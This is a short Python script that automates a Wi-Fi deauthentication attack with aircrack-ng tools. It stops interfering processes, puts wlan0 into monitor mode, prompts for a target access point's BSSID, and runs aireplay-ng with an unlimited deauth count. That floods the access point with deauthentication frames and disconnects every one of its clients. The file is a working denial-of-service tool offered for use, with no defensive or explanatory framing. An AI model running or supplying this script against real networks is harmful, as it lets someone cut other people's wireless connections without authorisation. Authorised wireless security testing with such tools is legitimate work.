import subprocess

def check_and_kill():
    print("Checking and killing processes...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)

def start_monitor_mode():
    print("Starting monitor mode on wlan0...")
    subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], check=True)

def deauth_attack(bssid):
    print(f"Performing deauth attack on BSSID {bssid}...")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "wlan0"], check=True)

def stop_monitor_mode():
    print("Stopping monitor mode on wlan0...")
    subprocess.run(["sudo", "airmon-ng", "stop", "wlan0"], check=True)

def main():
    check_and_kill()
    start_monitor_mode()

    # Get user input for BSSID
    bssid = input("Enter the BSSID (MAC address) of the AP: ")

    # Perform deauthentication attack
    deauth_attack(bssid)

    # Stop monitor mode
    stop_monitor_mode()


if __name__ == "__main__":
    main()
